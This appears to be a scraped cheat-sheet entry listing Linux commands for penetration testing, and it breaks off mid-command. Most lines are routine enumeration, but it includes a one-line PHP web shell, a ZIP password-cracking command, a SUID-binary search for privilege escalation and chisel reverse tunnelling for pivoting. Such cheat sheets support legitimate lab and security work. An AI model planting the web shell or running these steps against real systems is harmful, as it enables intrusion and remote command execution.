item.title: Linux
item.description: View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2>/dev/null PHP WebShell <?php system($_REQUEST['cmd']); ?> SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw '/' -ie "STRING_THAT_WANT_BE_FOUND" --color=always 2> /dev/null find .
